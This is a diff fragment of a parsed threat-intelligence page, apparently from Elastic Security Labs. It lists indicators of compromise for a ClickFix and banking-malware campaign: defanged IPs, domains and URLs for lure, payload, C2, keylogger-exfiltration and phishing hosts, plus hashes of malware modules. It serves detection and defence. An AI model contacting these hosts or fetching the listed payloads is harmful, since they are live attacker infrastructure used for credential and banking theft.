+      "68.211.161[.]46",
+      "ipv4",
+      "",
+      "ClickFix / file host"
+     ],
+     [
+      "http://68.211.161[.]46/",
+      "url",
+      "",
+      "ClickFix web root"
+     ],
+     [
+      "http://68.211.161[.]46/files/",
+      "url",
+      "",
+      "Open directory / toolkit staging"
+     ],
+     [
+      "http://68.211.161[.]46/validation.txt",
+      "url",
+      "",
+      "First-stage batch payload download"
+     ],
+     [
+      "http://68.211.161[.]46/driver.html?off",
+      "url",
+      "",
+      "Vishing page linking to Remote Utilities payload"
+     ],
+     [
+      "216.250.112[.]100",
+      "ipv4",
+      "",
+      "ClickFix / file host"
+     ],
+     [
+      "http://216.250.112[.]100/validation.txt",
+      "url",
+      "",
+      "First-stage batch payload download (osogransd variant)"
+     ],
+     [
+      "185.242.246[.]169",
+      "ipv4",
+      "",
+      "REF6045 C2"
+     ],
+     [
+      "https://185.242.246[.]169/b/editor.php",
+      "url",
+      "",
+      "C2 exposed config editor"
+     ],
+     [
+      "http://185.242.246[.]169/dashboard2/recData.php",
+      "url",
+      "",
+      "C2 beacon POST endpoint (osogransd variant)"
+     ],
+     [
+      "ratonvaquero2026[.]online",
+      "domain-name",
+      "",
+      "ClickFix / file host"
+     ],
+     [
+      "https://ratonvaquero2026[.]online/",
+      "url",
+      "",
+      "ClickFix lure host"
+     ],
+     [
+      "https://ratonvaquero2026[.]online/files/",
+      "url",
+      "",
+      "Toolkit file host"
+     ],
+     [
+      "monteviral2026.duckdns[.]org",
+      "domain-name",
+      "",
+      "ClickFix / file host"
+     ],
+     [
+      "https://monteviral2026.duckdns[.]org/",
+      "url",
+      "",
+      "ClickFix lure host"
+     ],
+     [
+      "https://monteviral2026.duckdns[.]org/files/",
+      "url",
+      "",
+      "Toolkit file host"
+     ],
+     [
+      "osogransd[.]online",
+      "domain-name",
+      "",
+      "ClickFix / file host"
+     ],
+     [
+      "https://osogransd[.]online/",
+      "url",
+      "",
+      "ClickFix lure host"
+     ],
+     [
+      "https://osogransd[.]online/files/",
+      "url",
+      "",
+      "Toolkit file host"
+     ],
+     [
+      "negratomasa2026[.]online",
+      "domain-name",
+      "",
+      "REF6045 C2"
+     ],
+     [
+      "https://negratomasa2026[.]online/dashboard2/recData.php",
+      "url",
+      "",
+      "C2 beacon POST endpoint"
+     ],
+     [
+      "https://negratomasa2026[.]online/dashboard2/avisos2.php",
+      "url",
+      "",
+      "Banking session alert endpoint"
+     ],
+     [
+      "https://negratomasa2026[.]online/dashboard2/imagenes.php",
+      "url",
+      "",
+      "Screenshot upload endpoint"
+     ],
+     [
+      "https://negratomasa2026[.]online/dashboard2/logs.php",
+      "url",
+      "",
+      "Keylogger exfil endpoint"
+     ],
+     [
+      "https://negratomasa2026[.]online/a/teleavisos.txt",
+      "url",
+      "",
+      "Remote config (arbitrary PowerShell)"
+     ],
+     [
+      "https://negratomasa2026[.]online/b/listadebancos.txt",
+      "url",
+      "",
+      "Banking window-title keywords"
+     ],
+     [
+      "https://negratomasa2026[.]online/b/keysnegativas.txt",
+      "url",
+      "",
+      "Negative keyword filter config"
+     ],
+     [
+      "https://negratomasa2026[.]online/a/telekeylogger.txt",
+      "url",
+      "",
+      "Telegram keylogger credentials config"
+     ],
+     [
+      "https://negratomasa2026[.]online/b/urlsscams.txt",
+      "url",
+      "",
+      "Phishing redirect target list"
+     ],
+     [
+      "https://negratomasa2026[.]online/b/clabes.txt",
+      "url",
+      "",
+      "CLABE replacement values"
+     ],
+     [
+      "https://negratomasa2026[.]online/b/tarjetas.txt",
+      "url",
+      "",
+      "Card-number replacement values"
+     ],
+     [
+      "https://negratomasa2026[.]online/b/editor.php",
+      "url",
+      "",
+      "C2 exposed config editor"
+     ],
+     [
+      "gestionmontelavaria2026[.]online",
+      "domain-name",
+      "",
+      "REF6045 C2"
+     ],
+     [
+      "https://gestionmontelavaria2026[.]online/dashboard2/recData.php",
+      "url",
+      "",
+      "C2 beacon POST endpoint (monteviral variant)"
+     ],
+     [
+      "https://gestionmontelavaria2026[.]online/b/editor.php",
+      "url",
+      "",
+      "C2 exposed config editor"
+     ],
+     [
+      "ssinvestigaciones[.]com",
+      "domain-name",
+      "",
+      "ClickFix post-CAPTCHA tracking endpoint"
+     ],
+     [
+      "https://ww.ssinvestigaciones[.]com/login3.php",
+      "url",
+      "",
+      "ClickFix post-CAPTCHA tracking endpoint"
+     ],
+     [
+      "bancaporinternetbbmx[.]online",
+      "domain-name",
+      "",
+      "Phishing page"
+     ],
+     [
+      "https://bancaporinternetbbmx[.]online",
+      "url",
+      "",
+      "Phishing redirect destination"
+     ],
+     [
+      "b30cb0aa977aacdab94d2ef503186c8f0b2fc10d7cf0d7c7c0ada70c127dc7e8",
+      "SHA-256",
+      "zkt.zip",
+      "Exposed web-root archive"
+     ],
+     [
+      "554f1aefeb698995501751328c2f9fe93f02a680679fba3dd15f1ed93d46bf1b",
+      "SHA-256",
+      "validation.txt",
+      "First-stage batch payload"
+     ],
+     [
+      "ff3555154e91e42490cc722b6c7f3c4c91654b7ef53a35d0719ffb89accf1b27",
+      "SHA-256",
+      "run.vbs",
+      "Master launcher"
+     ],
+     [
+      "526287a40aad1b218228cdd1f459ad3b93f858585048347644d597c6ab19515a",
+      "SHA-256",
+      "cliente.ps1",
+      "C2 beacon"
+     ],
+     [
+      "685d29ce8a550feb3a9e1d1c5926ec5e927615cf34aab62c108a812a1eb6737c",
+      "SHA-256",
+      "jujuzkt.ps1",
+      "Banking activity monitor"
+     ],
+     [
+      "8c87ea94401fa97d3743a87604e088d1a29c7b06cf9673623941a42da68452a6",
+      "SHA-256",
+      "jujuzkt2.ps1",
+      "Active browser redirect module"
+     ],
+     [
+      "6dcd7fdd5e088d98d861cbd1cb74a7b83ae5508f4dbb617413bcbe7fbc8a82e2",
+      "SHA-256",
+      "mensaje1.ps1",
+      "Vishing dispatcher"
+     ],
+     [
+      "4d9c160ebb44507b11f0e6421f691900284f25b5530a23d9fd50de0ae01663ca",
+      "SHA-256",
+      "mensaje.ps1",
+      "Hard-lock vishing overlay"
+     ],
+     [
+      "0315d4a7bc14654ad66d4c2b98920b92ca18cbc231b3ce5fba1fcac70b828e19",
+      "SHA-256",
+      "mensajeoff.ps1",
+      "Soft-lock vishing overlay"
+     ],
+     [
+      "5d17645548a44fe39d3cc816ffa3933321c1eb8b08a8f4348e3cd82f25112c81",
+      "SHA-256",
+      "rotor1.ps1",
+      "Screenshot module invoker"
+     ],
+     [
+      "566f4bfdfea54129b8528d50cae187a9030e2f2787749add4b0db22ac35ea581",
+      "SHA-256",
+      "screen2.ps1",
+      "Screenshot module"
+     ],
+     [
+      "882d582e85d5bb7abbdde791a2d52e3b1bb7dd7f79c20318ce64b74249221fdb",
+      "SHA-256",
+      "rotor2.ps1",
+      "Vishing dispatcher rotator"
+     ],
+     [
+      "eea08fbf3720d638af1d313d3ce369708b77d7891379d5c5871dd7f36667ed0c",
+      "SHA-256",
+      "clip.ps1",
+      "CLABE clipboard hijacker"
+     ],
+     [
+      "70140aa236d630a7d5ed08be3dafcccea9a8b0eec6dadf8c1cf1b96d8f608609",
+      "SHA-256",
+      "clip2.ps1",
+      "Card-number clipboard hijacker"
+     ],
+     [
+      "6c8ba7127a83431432e85946976c18bb3f3e9bf9def68aae572cd1d9d73604c7",
+      "SHA-256",
+      "avs.ps1",
+      "Remote Utilities downloader"
+     ],
+     [
+      "81a4512db985359ed361755da58a1177b07632b5aee951c68a6ace54f4d0534b",
+      "SHA-256",
+      "instaler.ps1",
+      "Remote Utilities installer launcher"
+     ],
+     [
+      "3d9015429d65276869ceb9c91f10d6474b1098042db75949c49b9f1682c1f3ae",
+      "SHA-256",
+      "remoto.ps1",
+      "Remote Utilities configurator"
+     ],
+     [
+      "5bc85b604eb37ffa1e67c57f4744b55ef876a1ab442e2a2440550ef0922aeec7",
+      "SHA-256",
+      "correr.ps1",
+      "Arbitrary PowerShell executor"
+     ],
+     [
+      "30ff24faad80184bb43660a8bd317df99a8d09d31bae3b446aaa876543f2620f",
+      "SHA-256",
+      "key.ps1",
+      "Telegram-backed keylogger"
+     ],
+     [
+      "4b7b35b921d7615b7a82a42c379560d1b0c5a74c81311a269874195ba2744f2d",
+      "SHA-256",
+      "cursor2.exe",
+      "Invisible-cursor utility"
+     ],
+     [
+      "5c7ab9e90b05804d07e9d803f85462bc1a44d0726256bad28219984ee2b5772f",
+      "SHA-256",
+      "cursor2.exe",
+      "Invisible cursor resource dropped by cursor2.exe"
+     ],
+     [
+      "32d981b3e7c36aa7030cfd9ee412bff742e00b36c39c80634b2681f89de4a487",
+      "SHA-256",
+      "hosts.msi",
+      "Remote Utilities installer"
+     ],
+     [
+      "cd7b179dd98848a02b9a1d4ebfeee26cdbb317b4ad53eb50786e18515b0cf804",
+      "SHA-256",
+      "ini.ps1",
+      "Delayed launcher"
+     ],
+     [
+      "345e8a90b7b762b065333cd068811d88086d157be713d89bdf200c927645f3d8",
+      "SHA-256",
+      "remo.ps1",
+      "IP-gated launcher"
+     ],
+     [
+      "0ec9b518f84b6bdc0e843b89fa755522ec67db862414ad16bdcaa8c2be25485c",
+      "SHA-256",
+      "edifhjwe.ps1",
+      "Self-updater"
+     ],
+     [
+      "26f906a2a4276b1968a8ce956a7b342aa9bc26f60d32c14668223877f569fb3f",
+      "SHA-256",
+      "rotor.ps1",
+      "Keylogger rotator"
+     ],
+     [
+      "13bfd0f695cea1d6ae570a7ca056ffe930467be73a26f29f95209618f383bd2d",
+      "SHA-256",
+      "4.bat",
+      "Early version of run.vbs"
+     ]
+    ],
+    "source": "html_dom",
+    "caption": null,
+    "headers": [
+     "Observable",
+     "Type",
+     "Name",
+     "Reference"
+    ]
+   },
+   "layout": "table",
+   "section": "Observables"
+  },
+  {
+   "id": "b212",
+   "page": null,
+   "text": "Report an issue",
+   "type": "paragraph",
+   "section": "Observables"
+  },
+  {
+   "id": "b213",
+   "page": null,
+   "text": "Related Content",
+   "type": "heading",
+   "level": 3,
+   "section": "Related Content"
+  },
+  {
+   "id": "b214",
+   "page": null,
+   "text": "Auditing the auditor: Unmasking Apex Accelerator",
+   "type": "paragraph",
+   "section": "Related Content"
+  },
+  {
+   "id": "b215",
+   "page": null,
+   "text": "Malware AnalysisThreat IntelligenceAI Security",
+   "type": "paragraph",
+   "section": "Related Content"
+  },
+  {
+   "id": "b216",
+   "page": null,
+   "text": "Auditing the auditor: Unmasking Apex Accelerator",
+   "type": "heading",
+   "level": 3,
+   "section": "Auditing the auditor: Unmasking Apex Accelerator"
+  },
+  {
+   "id": "b217",
+   "page": null,
+   "text": "October 12, 2026",
+   "type": "paragraph",
+   "section": "Auditing the auditor: Unmasking Apex Accelerator"
+  },
+  {
+   "id": "b218",
+   "page": null,
+   "text": "Jia Yu Chan",
+   "type": "paragraph",
+   "section": "Auditing the auditor: Unmasking Apex Accelerator"
+  },
+  {
+   "id": "b219",
+   "page": null,
+   "text": "+1",
+   "type": "paragraph",
+   "section": "Auditing the auditor: Unmasking Apex Accelerator"
+  },
+  {
+   "id": "b220",
+   "page": null,
+   "text": "The extension you never installed: KREMLIN forges Chrome's own integrity checks to steal banking sessions",
+   "type": "paragraph",
+   "section": "Auditing the auditor: Unmasking Apex Accelerator"
+  },
+  {
+   "id": "b221",
+   "page": null,
+   "text": "Malware AnalysisThreat Intelligence",
+   "type": "paragraph",
+   "section": "Auditing the auditor: Unmasking Apex Accelerator"
+  },
+  {
+   "id": "b222",
+   "page": null,
+   "text": "The extension you never installed: KREMLIN forges Chrome's own integrity checks to steal banking sessions",
+   "type": "heading",
+   "level": 3,
+   "section": "The extension you never installed: KREMLIN forges Chrome's own integrity checks to steal banking sessions"
+  },
+  {
+   "id": "b223",
+   "page": null,
+   "text": "September 14, 2026",
+   "type": "paragraph",
+   "section": "The extension you never installed: KREMLIN forges Chrome's own integrity checks to steal banking sessions"
+  },
+  {
+   "id": "b224",
+   "page": null,
+   "text": "Cyril François",
+   "type": "paragraph",
+   "section": "The extension you never installed: KREMLIN forges Chrome's own integrity checks to steal banking sessions"
+  },
+  {
+   "id": "b225",
+   "page": null,
+   "text": "+1",
+   "type": "paragraph",
+   "section": "The extension you never installed: KREMLIN forges Chrome's own integrity checks to steal banking sessions"
+  },
+  {
+   "id": "b226",
+   "page": null,
+   "text": "REVSTEALER ramps up: analysis of up-and-coming infostealer",
+   "type": "paragraph",
+   "section": "The extension you never installed: KREMLIN forges Chrome's own integrity checks to steal banking sessions"
+  },
+  {
+   "id": "b227",
+   "page": null,
+   "text": "Detection EngineeringMalware AnalysisThreat Intelligence",
+   "type": "paragraph",
+   "section": "The extension you never installed: KREMLIN forges Chrome's own integrity checks to steal banking sessions"
+  },
+  {
+   "id": "b228",
+   "page": null,
+   "text": "REVSTEALER ramps up: analysis of up-and-coming infostealer",
+   "type": "heading",
+   "level": 3,
+   "section": "REVSTEALER ramps up: analysis of up-and-coming infostealer"
+  },
+  {
+   "id": "b229",
+   "page": null,
+   "text": "September 02, 2026",
+   "type": "paragraph",
+   "section": "REVSTEALER ramps up: analysis of up-and-coming infostealer"
+  },
+  {
+   "id": "b230",
+   "page": null,
+   "text": "Daniel Stepanic",
+   "type": "paragraph",
+   "section": "REVSTEALER ramps up: analysis of up-and-coming infostealer"
+  },
+  {
+   "id": "b231",
+   "page": null,
+   "text": "+2",
+   "type": "paragraph",
+   "section": "REVSTEALER ramps up: analysis of up-and-coming infostealer"
+  },
+  {
+   "id": "b232",
+   "page": null,
+   "text": "TELEPUZ: a modular MaaS malware spreading via CLICKFIX-VIDAR chains",
+   "type": "paragraph",
+   "section": "REVSTEALER ramps up: analysis of up-and-coming infostealer"
+  },
+  {
+   "id": "b233",
+   "page": null,
+   "text": "Malware Analysis",
+   "type": "paragraph",
+   "section": "REVSTEALER ramps up: analysis of up-and-coming infostealer"
+  },
+  {
+   "id": "b234",
+   "page": null,
+   "text": "TELEPUZ: a modular MaaS malware spreading via CLICKFIX-VIDAR chains",
+   "type": "heading",
+   "level": 3,
+   "section": "TELEPUZ: a modular MaaS malware spreading via CLICKFIX-VIDAR chains"
+  },
+  {
+   "id": "b235",
+   "page": null,
+   "text": "July 16, 2026",
+   "type": "paragraph",
+   "section": "TELEPUZ: a modular MaaS malware spreading via CLICKFIX-VIDAR chains"
+  },
+  {
+   "id": "b236",
+   "page": null,
+   "text": "Cyril François",
+   "type": "paragraph",
+   "section": "TELEPUZ: a modular MaaS malware spreading via CLICKFIX-VIDAR chains"
+  },
+  {
+   "id": "b237",
+   "page": null,
+   "text": "Lost in relocation: analysis of a new loader distributing CASTLESTEALER",
+   "type": "paragraph",
+   "section": "TELEPUZ: a modular MaaS malware spreading via CLICKFIX-VIDAR chains"
+  },
+  {
+   "id": "b238",
+   "page": null,
+   "text": "Malware Analysis",
+   "type": "paragraph",
+   "section": "TELEPUZ: a modular MaaS malware spreading via CLICKFIX-VIDAR chains"
+  },
+  {
+   "id": "b239",
+   "page": null,
+   "text": "Lost in relocation: analysis of a new loader distributing CASTLESTEALER",
+   "type": "heading",
+   "level": 3,
+   "section": "Lost in relocation: analysis of a new loader distributing CASTLESTEALER"
+  },
+  {
+   "id": "b240",
+   "page": null,
+   "text": "June 19, 2026",
+   "type": "paragraph",
+   "section": "Lost in relocation: analysis of a new loader distributing CASTLESTEALER"
+  },
+  {
+   "id": "b241",
+   "page": null,
+   "text": "Daniel Stepanic",
+   "type": "paragraph",
+   "section": "Lost in relocation: analysis of a new loader distributing CASTLESTEALER"
+  },
+  {
+   "id": "b242",
+   "page": null,
+   "text": "+1",
+   "type": "paragraph",
+   "section": "Lost in relocation: analysis of a new loader distributing CASTLESTEALER"
+  },
+  {
+   "id": "b243",
+   "page": null,
+   "text": "Elastic Security Labs Newsletter",
+   "type": "heading",
+   "level": 3,
+   "section": "Elastic Security Labs Newsletter"
+  },
+  {
+   "id": "b244",
+   "page": null,
+   "text": "Follow Elastic Security Labs on",
+   "type": "paragraph",
+   "section": "Elastic Security Labs Newsletter"
+  }
+ ],
+ "language": "en"
+}
